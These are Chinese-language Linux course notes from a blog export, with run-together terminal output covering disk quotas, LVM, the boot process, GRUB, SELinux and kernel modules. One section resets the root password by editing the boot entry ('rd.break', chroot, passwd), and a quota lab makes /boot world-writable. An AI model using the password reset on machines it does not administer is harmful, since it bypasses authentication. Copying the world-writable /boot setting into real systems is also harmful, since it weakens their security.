aquota.group-rw-------. 1 root root 6144 Jul 1 16:03 aquota.userdrwx------. 2 student student 16384 Jul 1 15:56 lost+found[root@rhel6 skel]# quotaon /home/student[root@rhel6 skel]# repquota /home/student*** Report for user quotas on device /dev/vdb2Block grace time: 7days; Inode grace time: 7days Block limits File limitsUser used soft hard grace used soft hard grace----------------------------------------------------------------------student -- 48 0 0 9 0 0[root@rhel6 skel]# edquota studentedquota: WARNING - /dev/vdb2: cannot change current inode allocation[root@rhel6 skel]# edquota student[root@rhel6 skel]# repquota /home/student*** Report for user quotas on device /dev/vdb2Block grace time: 7days; Inode grace time: 7days Block limits File limitsUser used soft hard grace used soft hard grace----------------------------------------------------------------------student -+ 48 3072 6144 9 3 6 7days[root@rhel6 skel]# quota studentDisk quotas for user student (uid 500): Filesystem blocks quota limit grace files quota limit grace /dev/vdb2 48 3072 6144 9* 3 6 7days[root@rhel6 skel]# su - student[student@rhel6 ~]$ touch file{1..10}vdb2: write failed, user file limit reached.touch: cannot touch `file1&apos;: Disk quota exceededtouch: cannot touch `file2&apos;: Disk quota exceededtouch: cannot touch `file3&apos;: Disk quota exceededtouch: cannot touch `file4&apos;: Disk quota exceededtouch: cannot touch `file5&apos;: Disk quota exceededtouch: cannot touch `file6&apos;: Disk quota exceededtouch: cannot touch `file7&apos;: Disk quota exceededtouch: cannot touch `file8&apos;: Disk quota exceededtouch: cannot touch `file9&apos;: Disk quota exceededtouch: cannot touch `file10&apos;: Disk quota exceeded rhel7 quota实验root用户： 查看内核是否支持 quota 功能: dmesg | grep quota 查看 quota 程序包是否已经安装: rpm -q quota 查看 boot 目录是否支持 quota 功能(noquota 表示暂时不支持): mount|grep boot 让/boot 目录支持 quota 功能: vim /etc/fstab 属性中添加usrquota 重启主机后即可生效: reboot 查看 boot 目录是否支持 quota 功能(usrquota 表示已经支持): mount|grep boot 创建一个用于 quota 实验的用户 tom: useradd tom &amp;&amp; echo uplooking|passwd tom 需要允许其他用户对/boot 目录写入文件操作: chmod -Rf o+w /boot 使用 xfs_quota 命令设置对 tom 用户在/boot 目录的磁盘配额,具体要求如下:使用 quota 专家模式限制磁盘软限制为 3m、磁盘硬限制为 6m、文件软限制为 3 个且文件硬限制为 6 个。 获取当前/boot 目录上的 quota 配额限制12xfs_quota -x -c &apos;limit bsoft=3m bhard=6m isoft=3 ihard=6 tom&apos; /bootxfs_quota -x -c report /boot切换至 tom 用户: su - tom 正常创建了一个为 5M 的文件: dd if=/dev/zero of=/boot/tom bs=5M count=1 创建 8M 文件时强制终止并报错了: dd if=/dev/zero of=/boot/tom bs=8M count=1 查看当前用户的 quota 限制(显示硬盘配额已占满): quota 切换至root用户：exit 编辑 tom 的配额限制,将硬盘的硬限制修改为 8m(8192k): edquota -u tom 切换至 tom 用户: su - tom 再来创建 8m 的文件就不会有问题了: dd if=/dev/zero of=/boot/tom bs=8M count=1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667[root@rhel7 ~]# dmesg|grep quota[ 0.836809] VFS: Disk quotas dquot_6.5.2[root@rhel7 ~]# rpm -q quotaquota-4.01-11.el7.x86_64[root@rhel7 ~]# mount|grep boot/dev/vda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,noquota)[root@rhel7 ~]# vim /etc/fstabUUID=abbadca9-0a0d-453f-b713-d3d978cd6909 /boot xfs defaults,usrquota 1 2[root@rhel7 ~]# reboot[root@rhel7 ~]# mount|grep boot/dev/vda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,usrquota)[root@rhel7 ~]# useradd tom[root@rhel7 ~]# passwd tomChanging password for user tom.New password:BAD PASSWORD: The password fails the dictionary check - it is based on a dictionary wordRetype new password:passwd: all authentication tokens updated successfully.[root@rhel7 ~]# chmod -Rf o+w /boot[root@rhel7 ~]# ll -d /bootdr-xr-xrwx. 3 root root 4096 Jun 27 03:59 /boot[root@rhel7 ~]# xfs_quota -x -c &apos;limit bsoft=3m bhard=6m isoft=3 ihard=6 tom&apos; /boot[root@rhel7 ~]# xfs_quota -x -c report /bootUser quota on /boot (/dev/vda1) BlocksUser ID Used Soft Hard Warn/Grace---------- --------------------------------------------------root 120384 0 0 00 [--------]tom 0 3072 6144 00 [--------][root@rhel7 ~]# su - tomLast login: Fri Jul 1 02:51:33 EDT 2016 on pts/0[tom@rhel7 ~]$ dd if=/dev/zero of=/boot/tom bs=5M count=11+0 records in1+0 records out5242880 bytes (5.2 MB) copied, 0.0270144 s, 194 MB/s[tom@rhel7 ~]$ dd if=/dev/zero of=/boot/tom bs=8M count=1dd: error writing ‘/boot/tom’: Disk quota exceeded1+0 records in0+0 records out6291456 bytes (6.3 MB) copied, 0.218067 s, 28.9 MB/s[tom@rhel7 ~]$ quotaDisk quotas for user tom (uid 1001): Filesystem blocks quota limit grace files quota limit grace /dev/vda1 6144* 3072 6144 6days 1 3 6[tom@rhel7 ~]$ exitlogout[root@rhel7 ~]# edquota -u tomDisk quotas for user tom (uid 1001): Filesystem blocks soft hard inodes soft hard /dev/vda1 8192 3072 8192 1 3 6[root@rhel7 ~]# xfs_quota -x -c report /bootUser quota on /boot (/dev/vda1) BlocksUser ID Used Soft Hard Warn/Grace---------- --------------------------------------------------root 120384 0 0 00 [--------]tom 6144 3072 8192 00 [6 days][root@rhel7 ~]# su - tomLast login: Fri Jul 1 02:58:22 EDT 2016 on pts/0[tom@rhel7 ~]$ dd if=/dev/zero of=/boot/tom bs=8M count=11+0 records in1+0 records out8388608 bytes (8.4 MB) copied, 0.267325 s, 31.4 MB/s[tom@rhel7 ~]$ exitlogout 逻辑卷管理 LVM逻辑卷管理 (Logical Volume Manager) 作用当用户根据实际情况需要对分区增加、减小等调整时,经常会受到硬盘 “ 灵活性 ” 的限制,很不方便。 逻辑卷管理器则是在磁盘分区与文件系统之间添加的逻辑层,提供一个抽象的卷组,使得管理者可以忽略底层磁盘布局, 从而实现对分区的灵活动态调整,这毫不夸张,所以红帽 RHEL7 系统已经默认启用了 LVM(Logical Volume Manager) 机制。 原理 将物理分区做成 pv ；将 pv 组合成 vg ；再从 vg 分出 lv 分区 –&gt;pv–&gt;vg–&gt;lv 物理卷(PV,Physical Volume ): 整个硬盘设备或使用 fdisk 命令建立的硬盘分区。 卷组(VG,Volume Group ) :由一个或多个物理卷(PV)组成的整体 逻辑卷(LV,Logical Volume ):从卷组(VG)出切割出的空间来用于创建文件系统,大小由 PE 的个数决定。 步骤 实验实验：linear 目前用户的映射目标为linear型，线性型，/dev/vdb1 pv1 100M;/dev/vdb2 pv2 100M;/dev/vdb3 pv 3 100M—–&gt;myvg 300M—–&gt;lv1-linear 20M;lv2-linear 60M现在lv1-linear不够用了，需要拓展60M的空间，lv2-linear也不够用了，需要拓展30M的空间，如何做才能提高读写速度？ 123456789101112root@iscsi1-f15 ~]# dmsetup table|grep mymyvg-lv1--linear: 0 40960 linear 252:21 2048myvg-lv1--linear: 40960 32768 linear 252:21 165888myvg-lv1--linear: 73728 90112 linear 252:22 2048myvg-lv2--linear: 0 122880 linear 252:21 43008myvg-lv2--linear: 122880 65536 linear 252:22 92160–------------------------------------------------------------------------[root@iscsi1-f15 ~]# dmsetup table|grep myvgmyvg-lv1--linear: 0 73728 linear 252:25 2048myvg-lv1--linear: 73728 90112 linear 252:25 75776myvg-lv2--linear: 0 122880 linear 252:25 165888myvg-lv2--linear: 122880 65536 linear 252:25 288768 1234567891011121314151617181920212223242526272829303132[root@iscsi1-f15 ~]# fdisk /dev/vdb ---&gt;vdb[123] 100M[root@iscsi1-f15 ~]# pvcreate /dev/vdb[123][root@iscsi1-f15 ~]# vgcreate myvg /dev/vdb[123][root@iscsi1-f15 ~]# lvcreate -L 20M myvg -n lv1-linear[root@iscsi1-f15 ~]# lvcreate -L 60M myvg -n lv2-linear[root@iscsi1-f15 ~]# mkfs.ext4 /dev/myvg/lv1-linear[root@iscsi1-f15 ~]# mkfs.ext4 /dev/myvg/lv2-linear[root@iscsi1-f15 ~]# mount /dev/myvg/lv1-linear /opt/lv1[root@iscsi1-f15 ~]# mount /dev/myvg/lv2-linear /opt/lv2[root@iscsi1-f15 ~]# lvextend -L +60M /dev/myvg/lv1-linear[root@iscsi1-f15 ~]# lvextend -L +30M /dev/myvg/lv2-linear[root@iscsi1-f15 ~]# resize2fs /dev/myvg/lv1-linear[root@iscsi1-f15 ~]# resize2fs /dev/myvg/lv2-linear[root@iscsi1-f15 ~]# dmsetup table|grep mymyvg-lv1--linear: 0 40960 linear 252:21 2048myvg-lv1--linear: 40960 32768 linear 252:21 165888myvg-lv1--linear: 73728 90112 linear 252:22 2048myvg-lv2--linear: 0 122880 linear 252:21 43008myvg-lv2--linear: 122880 65536 linear 252:22 92160–------------------------------------------------------------------------[root@iscsi1-f15 ~]# fdisk /dev/vdb ---&gt;vdb4 500M vdb5 500M[root@iscsi1-f15 ~]# partx -a /dev/vdb[root@iscsi1-f15 ~]# pvcreate /dev/vdb[45][root@iscsi1-f15 ~]# vgextend myvg /dev/vdb[45][root@iscsi1-f15 ~]# pvmove /dev/vdb1 /dev/vdb4[root@iscsi1-f15 ~]# pvmove /dev/vdb2 /dev/vdb4[root@iscsi1-f15 ~]# pvmove /dev/vdb4 /dev/vdb5[root@iscsi1-f15 ~]# dmsetup table|grep myvgmyvg-lv1--linear: 0 73728 linear 252:25 2048myvg-lv1--linear: 73728 90112 linear 252:25 75776myvg-lv2--linear: 0 122880 linear 252:25 165888myvg-lv2--linear: 122880 65536 linear 252:25 288768 Linux文件系统和磁盘管理作业 分别在rhel6和rhel7上划分/dev/vdb磁盘，要求，/dev/vdb1大小为1G，/dev/vdb2大小为2G；创建对应操作系统默认的文件系统，rhel6默认ext4，rhel7默认xfs。 rhel6上将/dev/vdb2挂载在student家目录下使用，限制磁盘软限制为 3M、磁盘硬限制为 6M、文件软限制为 20 个且文件硬限制为 30 个 rhel7上完成：root用户：12345678910 1. 查看内核是否支持 quota 功能: 2. 查看 quota 程序包是否已经安装: 3. 查看 boot 目录是否支持 quota 功能(noquota 表示暂时不支持): 4. 让/boot 目录支持 quota 功能: 5. 重启主机后即可生效: 6. 查看 boot 目录是否支持 quota 功能(usrquota 表示已经支持): 7. 创建一个用于 quota 实验的用户 tom: 8. 需要允许其他用户对/boot 目录写入文件操作: 9. 使用 xfs_quota 命令设置对 tom 用户在/boot 目录的磁盘配额,具体要求如下:使用 quota 专家模式限制磁盘软限制为 3m、磁盘硬限制为 6m、文件软限制为 3 个且文件硬限制为 6 个。 获取当前/boot 目录上的 quota 配额限制切换至 tom 用户: 正常创建了一个为 5M 的文件: 创建 8M 文件时强制终止并报错了: 查看当前用户的 quota 限制(显示硬盘配额已占满): 切换至root用户： 编辑 tom 的配额限制,将硬盘的硬限制修改为 8m(8192k): 切换至 tom 用户: 再来创建 8m 的文件就不会有问题了: rhel6和rhel7上完成lvm逻辑卷管理，要求：123456781）/dev/vdb1 100M;/dev/vdb2 100M;/dev/vdb3 100M;/dev/vdb4 100M2) 将/dev/vdb[1,2,3,4]做成pv3）/dev/vdb1,/dev/vdb2组成vgtest300M4）从vgtest中划分50M的lvtest15）将lvtest1挂载到/mnt下使用6）拓展lvtest1至200M7）拓展lvtest1至400M8）缩小lvtest1至50M","link":"/2016/12/22/booboo_linux_base/09-Linux-disk/"},{"title":"Linux 开机启动流程","text":"启动流程概览 加载 BIOS 的硬件信息并自我测试 , 依据设定取得第一个可开机的装置 ; 读取并执行第一个开机装置内 MBR 的 boot Loader ( grub, spfdisk 等程序 ); 依据 boot loader 的设定加载 Kernel Kernel 会开始侦测硬件并加载驱动程序 ; 在硬件驱动成功后 ,Kernel 会主动呼叫 init 程序 init 会取得 run-level 信息 ; init 执行 /etc/rc.d/rc.sysinit 档案来准备软件执行的作业环境 ( 如网络、时区等 ); init 执行 run-level 的各个服务的启动 (script 方式 ); init 执行 /etc/rc.d/rc.local 档案 ; init 执行终端仿真程序 mingetty 来启动 login 程序 , 最后等待用户登入 详细讲解开机软件 —— BIOS、Grub 名词解释 BIOS 一个写入到主板上的一个软件程序,在开机的时候,计算机系统会主动执行第一个程序 HD 硬盘 MBR 主要启动记录区(Master Boot Record)该硬盘里的第一个扇区 512 bytes boot loader 开机管理程序,可读取核心文件并执行 446 bytes DPT 磁盘分割表(disk partition table)记录整颗硬盘分割状态 64 bytes 55AA 2 bytes 流程解释 通电后,服务器主版上的一个软件 BIOS 启动,他的任务就是找到带有开机程序的设备,此处以硬盘为例, BIOS 的任务结束; 该硬盘上的第一个扇区中有一个开机管理程序, rhel6 上为 grub1 , rhel7 上为 grub2 ,版本不同; 接下去就是 grub 在工作了。 BIOS开机时按下 pause break 暂停中断,可以看到 bios 的大概信息: AMIBIOS(C)2006 American Megatrends, Inc. 基本输入输出系统的版本为 AMIBIOS ,为美国趋势科技 2006 年生产 HP System BIOS – 033 (09/01/2011) 惠普系统的基本输入输出系统,支持到 2011/01/09 的硬件 Processor 1 Initiallized at 2.26 GHz with 8 MB cache 处理器 cpu 一个,频率为 2.26GHz , 8M 缓冲 16384MB Total Memory Detected 16G 内存 Asset Tag : 0111049 资产编号为 0111049 BMC Firmware Version 04.04(Jul/01/2009) BMC SDR Version : 2.18.1.17 basebiard management controller 底板管理控制器的缩写,时一个在 IPMI 结构下提供智能管理的控制器 IPMI 时智能平台管理界面,即与 intel 结构的企业系统中所使用外围设备采用的一种工业标准。 USB Device(s) : 1 Keyboard , 1 Mouse usb 设备有一个鼠标一个键盘,此处可以查看是否有人恶意用 usb 设备要攻击服务器 Auto-Detecting AHCI PORT 1 .. IDE Hard Disk 自动检测 开机按下 F10 ,进入 BIOS 管理界面 IPMI HP 服务器远程管理平台 开机文档 —— menu.lst、grub.confGrub 配置文档 menu.lst grub.conf 1234567891011121314151617181920212223242526272829303132[root@rhel6 grub]# ll /boot/grub/total 274-rw-r--r--. 1 root root 63 Jul 2 2015 device.map-rw-r--r--. 1 root root 13380 Jul 2 2015 e2fs_stage1_5-rw-r--r--. 1 root root 12620 Jul 2 2015 fat_stage1_5-rw-r--r--. 1 root root 11748 Jul 2 2015 ffs_stage1_5-rw-------. 1 root root 796 Jul 2 2015 grub.conf-rw-r--r--. 1 root root 11756 Jul 2 2015 iso9660_stage1_5-rw-r--r--. 1 root root 13268 Jul 2 2015 jfs_stage1_5lrwxrwxrwx. 1 root root 11 Jul 2 2015 menu.lst -&gt; ./grub.conf-rw-r--r--. 1 root root 11956 Jul 2 2015 minix_stage1_5-rw-r--r--. 1 root root 14412 Jul 2 2015 reiserfs_stage1_5-rw-r--r--. 1 root root 1341 May 7 2010 splash.xpm.gz-rw-r--r--. 1 root root 512 Jul 2 2015 stage1-rw-r--r--. 1 root root 126100 Jul 2 2015 stage2-rw-r--r--. 1 root root 12024 Jul 2 2015 ufs2_stage1_5-rw-r--r--. 1 root root 11364 Jul 2 2015 vstafs_stage1_5-rw-r--r--. 1 root root 13964 Jul 2 2015 xfs_stage1_5[root@rhel6 grub]# vim grub.confdefault=0 ===&gt;默认菜单timeout=5 ===&gt;启动菜单超时5秒进入默认启动内核splashimage=(hd0,0)/grub/splash.xpm.gz ===&gt;菜单的背景图片位置hiddenmenu ===&gt;默认不看启动菜单title Red Hat Enterprise Linux (2.6.32-431.el6.x86_64)开机启动的系统名称(可以更改对其他没有影响),指定启动硬盘位置在第一个硬盘的第一个分区root (hd0,0)指定核心文件的名称及位置 /boot/ ,指定语言等等kernel /vmlinuz-2.6.32-431.el6.x86_64 ro root=/dev/mapper/vg_rhel6-LogVol01 rd_NO_LUKSLANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 KEYBOARDTYPE=pcKEYTABLE=us rd_LVM_LV=vg_rhel6/LogVol01 rd_NO_DM rhgb quiet指定核心加载的模块文件 /boot/initrd /initramfs-2.6.32-431.el6.x86_64.img 流程解释 grub 软件的任务就是找到核心文件,并加载该文件 内核的第一任务就是驱动硬件 内核第二任务就是呼叫 init 程序,接下来就交给 init 了 init 程序流程解释 init 程序挂接 /etc 和 /lib 所在的目录分区 执行 /etc/inittab 文件,取得 run-level 信息,判断是否开启终端、网络等 执行 /etc/rc.d/rc.sysinit 初始化环境 ( 如网络、时区等 ) 执行 run-level 的各个服务的启动 (script 方式 ); 执行 /etc/rc.d/rc.local 档案 执行终端仿真程序 mingetty 来启动 login 程序,最后等待用户登入 init 执行的相关文件123456789101112131415161718192021222324[root@rhel6 ~]# cat /etc/inittab# Default runlevel. The runlevels used are:# 0 - halt (Do NOT set initdefault to this)# 1 - Single user mode# 2 - Multiuser, without NFS (The same as 3, if you do not have networking)# 3 - Full multiuser mode# 4 - unused# 5 - X11# 6 - reboot (Do NOT set initdefault to this)#id:5:initdefault: ===&gt;默认启动等级(run-level)为5(中间的数字为启动等级)[root@rhel6 etc]# ll /etc/rc.d ===&gt;根据默认启动等级，来读取相应的rc0-6.d目录中的文件total 60drwxr-xr-x. 2 root root 4096 Jul 2 2015 init.d-rwxr-xr-x. 1 root root 2617 Oct 10 2013 rcdrwxr-xr-x. 2 root root 4096 Jul 2 2015 rc0.ddrwxr-xr-x. 2 root root 4096 Jul 2 2015 rc1.ddrwxr-xr-x. 2 root root 4096 Jul 2 2015 rc2.ddrwxr-xr-x. 2 root root 4096 Jul 2 2015 rc3.ddrwxr-xr-x. 2 root root 4096 Jul 2 2015 rc4.ddrwxr-xr-x. 2 root root 4096 Jul 2 2015 rc5.ddrwxr-xr-x. 2 root root 4096 Jul 2 2015 rc6.d-rwxr-xr-x. 1 root root 220 Oct 10 2013 rc.local-rwxr-xr-x. 1 root root 19432 Oct 10 2013 rc.sysinit 文件夹里都是软连接，软链接链接到/etc/rc.d/init.d目录下的文件，目录下都是服务的启动脚本，目录和etc/init.d下的内容一样，因为有个软连接在etc下面rcX.d下的文件K开头表示服务要关闭的，S开头的表示系统启动时要开启的，（例如rc0.d下，几乎都是K打头的），在5里后面的数字标示优先级，数字小优先级高，在6里这些数字无用，因为是并行的，没有依赖关系。 无论是3还是5的runlevel，最后都会读到S99local文件，链接到/etc/rc.d/rc.local文件 文件说明：这个脚本在所有脚本执行完之后执行，开机过程汇总最后读到的一个文件，这个文件是开机自定义启动脚本，把自己想要执行的命令写进来。系统启动命令也会完成。 备注:以上分析均为 rhel6 操作系统, rhel7 启动改为 systemd 模式,相关文件在 /usr/lib/systemd/system/* run-level(启动等级)Runlevel 0 是让init关闭所有进程并终止系统。 Runlevel 1 是用来将系统转到单用户模式，单用户模式只能有系统管理员进入，在该模式下处理那些在有登录用户的情况下不能进行更改的文件。 Runlevel 2 是允许系统进入多用户的模式，但并不支持文件共享，这种模式很少应用。 Runlevel 3 是最常用的运行模式，主要用来提供真正的多用户模式，也是多数服务器的缺省模式。 Runlevel 4 一般不被系统使用，用户可以设计自己的系统状态并将其应用到runlevel 4阶段，尽管很少使用，但使用该系统可以实现一些特定的登录请求。 Runlevel 5 是将系统初始化为专用的X Window终端。对功能强大的Linux系统来说，这并不是好的选择，但用户如果需要这样，也可以通过在runlevel启动来实现该方案。 Runlevel 6 是关闭所有运行的进程并重新启动系统。 相关的命令rhel6 chkconfig –list ===&gt;查看不同等级中各项服务的启动情况(开机启动项) chkconfig 服务名 on ===&gt;开启某个服务开机自启动，off代表关闭 chkconfig –level 35 服务名 off ===&gt;在启动等级为3和5的时候该服务不开机启动 rhel7 开机自启的服务通过systemctl enable命令来实现 Systemctl enable httpd ===&gt;自启动httpd服务，关闭使用disable。 systemctl get-default ===&gt;查看当前默认启动级别(启动级别的说明查看/etc/inittab) systemctl set-default multi-user.target ===&gt;设置默认启动级别为3(7的的启动级别名称有所变化) 实验rhel6 单用户模式修改密码 1&gt; 进入到数及时界面时,按上下键进入以下界面,选择 kernel 一行,按下 e 进行编辑 2&gt; 在最后追加 “空格”和1 或者 “空格” single 后,按下 esc 3&gt; 再按下 b ,启动后,进入单人模式后,输入 passwd 进行密码修改,修改完成后, reboot 即可。 rhel7 单用户模式修改密码 1&gt; 进入如下界面后按 e 进入编辑模式 2&gt; 找到 linux16 开始的那一行,删除没用的,在最后追加 rd.break ,然后按 Ctrl+x 重启即可进入单人模式 3&gt; 进入单用户模式后,用 mount 命令查看一下,会发现根目录时只读模式,因此需要重新挂载为读写模式 123456mount -o remount,rw /sysrootchroot /sysroot ===&gt;提高权限passwd ===&gt;修改密码的命令touch /.autorelabel ===&gt;autorelabel 自动重新标记, selinuxexitexit ###rhel6 GRUB菜单加密 grub-md5-crypt 输入密码，生成一串MD5值，这个就是grub密码，复制好这段内容，粘贴到配置文件中 vim /boot/grub/grub.conf title那一行的上面加上“password redhat”这样做是明文密码，不安全，所以也可写为“password –-md5 xxxxxxxxx” 这一行要放在title的上面 放在title的下面是系统启动需要密码才可以启动 rhel7 GRUB2菜单加密vim /etc/grub.d/40_custom set superusers=”root” ===&gt;设置超级用户的名称，注意：名称任意可以不用是系统中存在的用户 password root redhat ===&gt;设置用户名和密码，注意：该密码为明文，如果需要密文需要生成密文密码 保存退出 grub2-mkconfig -o /boot/grub2/grub.cfg ===&gt;使用该命令来重新生成grub.cfg文件来使配置生效 grub2-mkpasswd-pbkdf2 ===&gt;该命令为生成加密密码 password_pbkdf2 ===&gt;如果使用加密的密文需要定义密码的加密方式，后面同上跟上用户名和加密后的密码 Linux 开机启动流程课后作业 名词解释 BIOS MBR boot loader grub DPT 55AA 请自己描述 linux 开机启动的流程,并画出流程图。 linux 破解 root 密码","link":"/2016/12/22/booboo_linux_base/10-Linux-startup-process/"},{"title":"Linux SELINUX","text":"SELinuxSecurity Enhanced Linux 安全强化的 Linux 作用强制限制某些操作 , 属于权限的一种 思考 : 到目前为止学过的 linux 中的权限 ? u\\g\\o r\\w\\x ssid\\sgid\\stid acl attr 配置文件/etc/selinux/config 12345678910111213141516[#15#root@rhel6 ~]#ll /etc/selinux/config-rw-r--r--. 1 root root 458 Jul 2 2015 /etc/selinux/config[#16#root@rhel6 ~]#ll /etc/sysconfig/selinuxlrwxrwxrwx. 1 root root 17 Jul 2 2015 /etc/sysconfig/selinux -&gt; ../selinux/config[#17#root@rhel6 ~]#cat /etc/selinux/config# This file controls the state of SELinux on the system.# SELINUX= can take one of these three values: 【三种状态】# enforcing - SELinux security policy is enforced. 【打开 selinux , 并强制限制】# permissive - SELinux prints warnings instead of enforcing. 【打开 selinux , 不限制操作 , 但会警告】# disabled - No SELinux policy is loaded. 【关闭 selinux 】SELINUX=enforcing# SELINUXTYPE= can take one of these two values: 【两种类型】# targeted - Targeted processes are protected, 【针对网络服务较多 , 针对主机较少】# mls - Multi Level Security protection. 【全方位的控制】SELINUXTYPE=targeted 重启电脑后生效 , 并永久生效 相关指令 查看当前 selinux 状态的命令 : getenforce/sestatus 设置 selinux 状态 ( 临时生效 ): setenforce [ Enforcing | Permissive | 1 | 0 ] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364[#12#root@rhel6 ~]#getenforceEnforcing[#13#root@rhel6 ~]#sestatusSELinux status:enabledSELinuxfs mount:/selinuxCurrent mode:enforcingMode from config file:enforcingPolicy version:28Policy from config file:targeted[root@rhel7 ~]# setenforce 0[root@rhel7 ~]# getenforcePermissive[root@rhel7 ~]# sestatusSELinux status:enabledSELinuxfs mount:/sys/fs/selinuxSELinux root directory:/etc/selinuxLoaded policy name:targetedCurrent mode:permissiveMode from config file:enforcingPolicy MLS status:enabledPolicy deny_unknown status: allowedMax kernel policy version: 28[root@rhel7 ~]# which getenforce/usr/sbin/getenforce[root@rhel7 ~]# rpm -qf /usr/sbin/getenforcelibselinux-utils-2.2.2-6.el7.x86_64[root@rhel7 ~]# rpm -ql libselinux-utils|head/usr/sbin/avcstat/usr/sbin/getenforce/usr/sbin/getsebool/usr/sbin/matchpathcon/usr/sbin/selinuxconlist/usr/sbin/selinuxdefcon/usr/sbin/selinuxenabled/usr/sbin/selinuxexeccon/usr/sbin/setenforce/usr/share/man/man5/booleans.5.gz[root@rhel7 ~]# which sestatus/usr/sbin/sestatus[root@rhel7 ~]# rpm -qf /usr/sbin/sestatuspolicycoreutils-2.2.5-11.el7.x86_64[root@rhel7 ~]# rpm -ql policycoreutils|head/etc/sestatus.conf/usr/bin/secon/usr/sbin/fixfiles/usr/sbin/genhomedircon/usr/sbin/load_policy/usr/sbin/restorecon/usr/sbin/semodule/usr/sbin/sestatus/usr/sbin/setfiles/usr/sbin/setsebool 操作限制的实现方法 通过 bool 值来进行操作的限制 1&gt;getsebool -a &lt;== 显示主机中所有的布尔值 2&gt;setsebool [-PV] boolean value | bool1=val1 bool2=val2 … 通过安全上下文主体（进程）与目标的安全上下文必须一致才能够顺利访问查看安全上下文1234567891011121314[#19#root@rhel6 ~]#ls -Z-rw-------. root root system_u:object_r:admin_home_t:s0 anaconda-ks.cfgdrwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Desktopdrwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Documentsdrwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Downloads-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 index.php3?stat=26-rw-r--r--. root root system_u:object_r:admin_home_t:s0 install.log-rw-r--r--. root root system_u:object_r:admin_home_t:s0 install.log.syslogdrwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Musicdrwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Picturesdrwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Public-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 root@172.25.0.10drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Templatesdrwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Videos 安全上下文主要用冒号分为三个字段 : Identify:role:type 身份识别 : 角色 : 类型1.5 selinux 所需要的服务 身份标识和角色并不重要，安全上下文里重要的就是这个类型，一个主体进程能不能读取到这个文件资源与类型字段有关。之前我们说进程和文件的上下文的类型必须要匹配。这里涉及到两个专有名词，一个叫域，一个叫类型。其中主体程序中称为域，文件资源上称为类型，是不是有种听天书的感觉？很拗口吧？我们来举个列子。先将httpd服务开启，service httpd startCd /var/www/html 这里是一个系列的网页文件，可以看到文件类型属于httpd_sys_content_t 还有httpd_sys_script_exec_t。然后我们再看进程的上下文类型先查看有没有这个进程 pstree | grep httpd然后查看进程的安全上下文 ps aux -Z | grep http。在这里Httpd是一个域，selinux的策略针对这个域制定了许多的规则，其中包括这个域可以读的目标资源类型，比如sys_content。主题进程和目标的文件的安全上下文必须匹配不然会有权限报错的提示 修改安全上下文使用chcon命令来更改安全上下文的类型12345[root@python tmp]# ls --context test.txt-rw-r--r-- root root root:object_r:staff_tmp_t test.txt[root@python tmp]# chcon -t etc_t test.txt[root@python tmp]# ls -lZ test.txt-rw-r--r-- root root root:object_r:etc_t test.txt ###Selinux的日志分析工具sealertsetroubleshoot 1234567891011[#40#root@rhel6 ~]#yum install -y setroubleshoot ===&gt;安装日志分析工具[#42#root@rhel6 ~]#rpm -ql setroubleshoot-server|head/etc/audisp/plugins.d/sedispatch.conf/etc/dbus-1/system.d/org.fedoraproject.SetroubleshootFixit.conf/etc/dbus-1/system.d/org.fedoraproject.Setroubleshootd.conf/etc/logrotate.d/setroubleshoot/etc/setroubleshoot/etc/setroubleshoot/setroubleshoot.conf/usr/bin/sealert[#40#root@rhel6 ~]#Sealert -a /var/log/audit/audit.log ===&gt;使用日志分析工具来分析selinux的日志等待数据处理，处理完毕之后查看 setroubleshot 将 selinux 相关的错误信息和解决方法记录在 /var/log/messages 日志中。cat /var/log/messages | grep setroubleshoot auditd auditd –&gt; 将 selinux 相关的信息记录在 /var/log/audit/audit.log 日志中,非常详细。 sealert -a /var/log/audit/audit.log selinux-policy-develel6 上没有该软件123456[root@rhel7 ~]# yum list|grep selinux-policy-develselinux-policy-devel.noarch 3.12.1-153.el7 server[#64#root@rhel6 ~]#yum list|grep selinux-policy-develThis system is not registered to Red Hat Subscription Management. You can use subscription-managerto register.man 关键词 _selinux 查找和关键字相关的 selinux 限制具体内容 , 包括什么打开什么布尔值 , 需要设置怎样的安全上下文。","link":"/2016/12/22/booboo_linux_base/12-SELINUX/"},{"title":"Linux 内核","text":"WHERE内核与内核模块在哪里呢?内核模块都有哪些呢?下面的表中都列出来了: 内核 /boot/vmlinuz-version 内核解压缩所需 RAM Disk /boot/initrd-version 内核模块 /lib/modules/$(uname -r)/kernel WHAT开机时,内核第一任务就是驱动硬件,激活机器。相关的驱动模块放在 /lib/modules/$(uname -r)/ 目录下,下面以 rhel6 为例,看看该目录下都有些什么: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64buildmodules.depmodules.networking modules.usbmapextramodules.dep.binmodules.ofmapsourcekernelmodules.drmmodules.orderupdatesmodules.aliasmodules.ieee1394map modules.pcimapvdsomodules.alias.bin modules.inputmap modules.seriomap weak-updatesmodules.blockmodules.isapnpmap modules.symbolsmodules.ccwmap modules.modesetting modules.symbols.bin[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64/kernel/arch crypto drivers fs kernel lib mm net sound[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64/kernel/drivers/acpicpufreq hidledsnetrtcvhostatacrypto hvmdparport scsi videoatmdcahwmonmedia pciserial virtioauxdisplay dmai2cmemstick pcmcia ssbwatchdogbcmaedac idlemessage platform staging xenblockfirewire ieee802154 mfdpowertargetbluetooth firmware infiniband miscppsuiocdromgpioinputmmcptpusbchargpuisdnmtdregulator uwb[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64/kernel/drivers/net3c59x.ko 